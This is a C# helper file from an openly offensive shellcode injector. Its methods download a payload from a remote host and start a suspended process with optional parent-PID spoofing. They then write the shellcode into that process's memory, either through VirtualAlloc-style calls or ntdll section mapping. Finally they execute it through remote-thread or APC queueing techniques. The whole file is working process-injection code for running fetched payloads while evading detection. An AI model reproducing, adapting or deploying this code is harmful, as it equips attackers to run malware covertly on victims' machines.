﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using static Shellcode_Injector.WinApi;


namespace Shellcode_Injector
{
    internal class Helpers
    {
        //Fetch the file from remote host
        public static byte[] Fetch(string host, string file)
        {
            try
            {
                Console.WriteLine($"Fetching {file} from {host}");
                WebClient client = new WebClient();
                client.BaseAddress = host;
                byte[] sc = client.DownloadData(file);
                return sc;
            }
            catch (WebException ex)
            {
                Console.WriteLine("An error occurred while making the HTTP request:");
                throw new Win32Exception(ex.Message);
            }
            catch (ArgumentException ex)
            {
                throw new Win32Exception("Provide the host with a valid scheme: http/https");
            }
        }

        //Create proc and return the process information struct,
        //its possible to spoof the ppid with an arbirary one
        public static WinApi.PIN StartS(bool spoof_ppid, uint ppid, string cmd, string cwd)
        {

            var sin = new WinApi.SINEX();
            sin.StartupInfo = new WinApi.SIN();
            sin.StartupInfo.cb = (int)Marshal.SizeOf(typeof(WinApi.SINEX));

            // Check if spoof_ppid is enabled, if yes open a handle to the provided PID
            if (spoof_ppid)
            {
                Console.WriteLine($"Attempting to spoof PPID to {ppid}");
                // Initialize the attribute list
                sin.lpAttributeList = IntPtr.Zero;
                IntPtr psize = IntPtr.Zero;

                //InitializeProcThreadAttributeList
                WinApi.InitAtt(IntPtr.Zero, 1, 0, ref psize);
                //Allocating memory for the attributes
                sin.lpAttributeList = Marshal.AllocHGlobal(psize);
                WinApi.InitAtt(sin.lpAttributeList, 1, 0, ref psize);

                //Set the parent process attribute
                WinApi.PPROC pproc = new WinApi.PPROC();
                IntPtr ppcs = WinApi.OpenP(0x001F0FFF, false, ppid); //ALL ACCESS
                pproc.hParentProcess = ppcs;

                //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                const int PTAPP = 0x00020000;

                bool sccs = WinApi.UpdateAtt(
                    sin.lpAttributeList, 
                    0, 
                    new IntPtr(PTAPP), 
                    ref pproc,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero, 
                    IntPtr.Zero);

                if (!sccs) 
                {
                    Console.WriteLine("Error updating attrs");
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

            }

            var pattr = new WinApi.SATTR();
            var tattr = new WinApi.SATTR();
            var pin = new WinApi.PIN();

            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);

            //Create a suspended process with extended startup info
            bool ok = WinApi.Starter(
                    cmd,
                    null,
                    ref pattr,
                    ref tattr,
                    false,
                    (uint)WinApi.proc.sspnd | (uint)WinApi.proc.extinf,
                    IntPtr.Zero,
                    cwd,
                    ref sin,
                    out pin
                );
            if (!ok)
            {
                Console.WriteLine("Error starting proc");
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine($"Proc created with PID {pin.dwProcessId}");
                WinApi.DelAtt(sin.lpAttributeList);
                return pin;
            }
        }

        //Allocate memory and write the shellcode - for CreateRemoteThread or QueueUserAPC
        public static IntPtr MWrite(IntPtr phand, byte[] sc) 
        {
            Console.WriteLine("Allocating space trough virtual alloc");
            IntPtr our_place = WinApi.Allocate(
                phand, 
                IntPtr.Zero, 
                (uint)sc.Length, 
                (uint)WinApi.mem.cmt_rv, 
                (uint)WinApi.mem.rw);

            WinApi.WriteMem(phand, our_place, sc, (uint)sc.Length, out _);
            WinApi.Protect(phand, our_place, (int)sc.Length, (uint)WinApi.mem.rx, out _);
            return our_place;
        }

        //Allocate memory and write the shellcode trough ntdll.dll functions
        // To be used with NtCreateThreadEx or NtQueueApcThread
        public static IntPtr NTMWrite(IntPtr phand, byte[] sc) 
        {
            Console.WriteLine("Allocating space trough nt section");
            var hsec = IntPtr.Zero;
            var sc_size = (ulong)sc.Length;
            //Create new memory block section in the current process
            WinApi.cSection(
                ref hsec,
                (ulong)WinApi.gen.sec_accs,
                IntPtr.Zero,
                ref sc_size,
                (uint)WinApi.mem.rwx,
                (ulong)WinApi.gen.sec_cmt,
                IntPtr.Zero
                );

            //Map the view of the created section into the memory of the current process
            WinApi.mvSection(
                hsec,
                (IntPtr)(-1),   // Will target current Process
                out var laddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,             // ViewUnmap (created view will not be inherited by child processes)
                0,
                (uint)WinApi.mem.rw
                );

            //Copy the shellcode
            Marshal.Copy(sc, 0, laddr, sc.Length);

            //Map the created region as RX into the remote process
            WinApi.mvSection(
                hsec,
                phand,
                out var raddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                (uint)WinApi.mem.rx
                );
            return raddr;
        }

        //Run the shellcode - techniques (CreateRemoteThread, QueueUserAPC), process info, memory pointer
        public static void SCRun(string tchq, WinApi.PIN proc, IntPtr mem) //TODO pass in the process info struct
        {
            if (tchq == "crt")
            {
                Console.WriteLine("Executing the code trough creating remote thread");
                IntPtr rmth = WinApi.RemoteThread(proc.hProcess, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                WinApi.Waiter(rmth, (uint)WinApi.mem.end);
            } else if (tchq == "qua") 
            {
                Console.WriteLine("Executing the code trough queue user apc");
                WinApi.APC(mem, proc.hThread, 0);
                WinApi.Resume(proc.hThread);
            }
        }

        //Run the shellcode trough ntdll.dll - techniques (NtCreateThreadEx, NtQueueApcThread)
        public static void NTSCRun(string tchq, WinApi.PIN proc, IntPtr mem) 
        {
            if (tchq == "ncte")
            {
                Console.WriteLine("Executing the code trough nt create thread");
                WinApi.cThread(
                    out _,
                    (ulong)WinApi.gen.thr_accs,
                    IntPtr.Zero,
                    proc.hProcess,
                    mem,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero
                    );
            } else if (tchq == "nqat") 
            {
                Console.WriteLine("Executing the code trough nt queue APC thread");
                WinApi.NAPC(proc.hThread, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                WinApi.Resume(proc.hThread);
            }
        }

        //Get a remote handle
        public static IntPtr GetHand(int id) 
        {
            var proc = Process.GetProcessById(id);
            return proc.Handle;
        }
    }
}
